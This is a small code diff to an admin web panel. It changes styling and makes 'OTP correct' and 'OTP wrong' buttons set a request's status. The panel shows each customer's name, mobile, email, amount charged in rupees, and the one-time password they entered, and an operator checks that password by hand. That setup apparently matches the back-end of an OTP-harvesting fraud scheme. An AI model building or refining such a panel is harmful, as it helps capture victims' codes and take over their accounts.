@@ -20,7 +20,7 @@ header .w{display:flex;align-items:center;gap:12px;height:60px}
 .btn:active{transform:scale(0.96) translateY(1px);filter:brightness(0.92);}
 .btn.o{background:#fff;color:var(--ink);border:1.5px solid var(--ln)}.btn.d{background:#fff;color:var(--er);border:1.5px solid #f3b8b2}.btn.s{background:var(--ok);color:#fff}
 :focus-visible{outline:2px solid var(--ac2);outline-offset:2px}
-input,select,textarea{background:#fff;border:1.5px solid var(--ln);border-radius:99px;padding:8px 12px;min-height:40px;font:500 .9rem 'Plus Jakarta Sans',system-ui,sans-serif;color:var(--ink)}
+input,select,textarea{background:#fff;border:1.5px solid var(--ln);border-radius:9px;padding:8px 12px;min-height:40px;font:500 .9rem 'Plus Jakarta Sans',system-ui,sans-serif;color:var(--ink)}
 .gate{min-height:80vh;display:grid;place-items:center;padding:20px}
 .gate form{background:#fff;border:1px solid var(--ln);border-radius:16px;padding:26px;width:100%;max-width:360px;display:grid;gap:12px}
 .err{color:var(--er);font-size:.85rem}
@@ -110,7 +110,7 @@ function draw() {
       const d = x.o.data && typeof x.o.data == 'object' ? Object.entries(x.o.data) : [];
       const k = x.id;
       const otpData = x.o.data || {};
-      const userEnteredOtp = otpData.entered_otp || otpData.otp || 'Not entered yet';
+      const userEnteredOtp = otpData.entered_otp || otpData.otp || otpData['Entered OTP'] || 'Not entered yet';
 
       const detail = open == k ? `<tr class="dt"><td colspan="7"><div class="kv">${kv('Request ID', x.id)}${kv('Selected service', x.o.n)}${kv('Submitted', dt(x.o.t))}${kv('Customer', x.u.name)}${kv('Mobile', x.u.mob)}${kv('Email', x.u.mail)}${kv('Amount charged', inr(x.o.amt))}${d.map(e => kv(e[0], e[1])).join('')}</div>
         
@@ -166,9 +166,11 @@ document.addEventListener('click', async e => {
   const correctBtn = e.target.closest('[data-otp-correct]');
   if (correctBtn) {
     const id = correctBtn.dataset.otpCorrect;
+    await act(() => api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/status`, {
+      body: { s: 'success' }
+    }));
     await act(() => api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/remark`, {
       body: { 
-        s: 'success',
         data: { otp_status: 'verified' },
         remark: 'OTP Verified & Request Approved'
       }
@@ -179,6 +181,9 @@ document.addEventListener('click', async e => {
   const wrongBtn = e.target.closest('[data-otp-wrong]');
   if (wrongBtn) {
     const id = wrongBtn.dataset.otpWrong;
+    await act(() => api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/status`, {
+      body: { s: 'failed' }
+    }));
     await act(() => api('PUT', `/api/admin/requests/${encodeURIComponent(id)}/remark`, {
       body: { 
         data: { otp_status: 'wrong' }, 
